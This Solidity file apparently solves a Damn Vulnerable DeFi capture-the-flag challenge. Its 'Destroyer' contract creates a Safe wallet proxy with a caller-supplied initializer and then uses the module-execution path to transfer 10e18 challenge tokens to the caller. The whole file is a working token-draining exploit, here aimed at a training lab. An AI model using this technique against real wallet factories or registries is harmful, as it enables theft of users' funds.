// SPDX-License-Identifier: MIT
pragma solidity = 0.8.25;
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import "safe-smart-account/contracts/common/Enum.sol";
contract Destroyer {
    function attack(SafeProxyFactory walletFactory, address singleton, bytes calldata initializer, uint256 i, IProxyCreationCallback callback, DamnValuableToken token) external {
        SafeProxy proxy = walletFactory.createProxyWithCallback(singleton, initializer, i, callback);
        Safe(payable(address(proxy))).execTransactionFromModule(address(token), 0, abi.encodeCall(token.transfer, (msg.sender, 10e18)), Enum.Operation.Call);
    }
}